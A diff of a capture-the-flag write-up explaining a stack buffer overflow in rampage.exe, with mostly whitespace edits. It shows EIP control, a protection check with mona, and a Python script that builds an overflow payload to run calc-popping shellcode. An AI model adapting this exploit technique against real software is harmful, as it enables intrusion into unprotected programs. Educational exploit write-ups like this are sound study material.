@@ -181,6 +181,7 @@ Yes we successfully control the EIP! Now need to find an address to execute!
 First, we need to check the protection of the program (Buffer Overflow Prevention)
 
 We can use `mona` command inside the debugger, by typing `!mona mod` to list the properties:
+
 ![image6](image6.png)
 
 Notice the main program `rampage.exe` does not enable `ASLR` (Ramdomize stack address) and `NXCompat` (Disallow to execute code in stack)
@@ -192,20 +193,21 @@ Now lets try to execute shellcode on stack!
 
 Create a python script to generate the `buf` file:
 ```py
-address = "0019FF30"						# We place the shellcode at 0x0019FF30
+address = "0019FF30"				# We place the shellcode at 0x0019FF30
 address = address.decode("hex")
 eip = ''
 for a in address:
-	eip = chr(ord(a) ^ 0xcc) + eip		# XOR with 0xCC and append inversely
-										# Because of little-endian in binary
+	eip = chr(ord(a) ^ 0xcc) + eip	# XOR with 0xCC and append inversely
+									# Because of little-endian in binary
 
-open("buf",'w').write("a"*16 + eip + "b") 	 # The "b" will become 0xCC
-											 # 0xCC in machine code is mean breakpoint 
-											 # so it will stop executing when it 
-											 # execute this address (0x0019FF30) 
+open("buf",'w').write("a"*16 + eip + "b") 	# The "b" will become 0xCC
+											# 0xCC in machine code is mean breakpoint 
+											# so it will stop executing when it 
+											# execute this address (0x0019FF30) 
 ```
 
 Run it using debugger:
+
 ![image7](image7.png)
 
 Notice that I successfully trigged a breakpoint! (At 0019FF30)
@@ -262,6 +264,7 @@ open("buf",'w').write("a"*16 + eip + shellcode + "\n")
 ```
 
 Run it on debugger again:
+
 ![image8](image8.png)
 
 Notice there is an error message: `Access violation when writing to [001A0000]`
@@ -315,9 +318,9 @@ It successfully execute `calc.exe` (Calculator)!!
 # Solution
 Using Buffer Overflow vulnerability to execute shellcode that will pop out `calc.exe`.
 
-1. Use this [Python script](solve.py) to generate the `buf` file (In the same directory as rampage.exe).
+1. Use this [Python script](solve.py) to generate the [buf](buf) file (In the same directory as rampage.exe).
 
 2. Running `rampage.exe` will pop out `calc.exe`.
 
-Test run in Windows 10 64-bit:
+Test run the program in **Windows 10 64-bit**:
 ![video](video.gif)
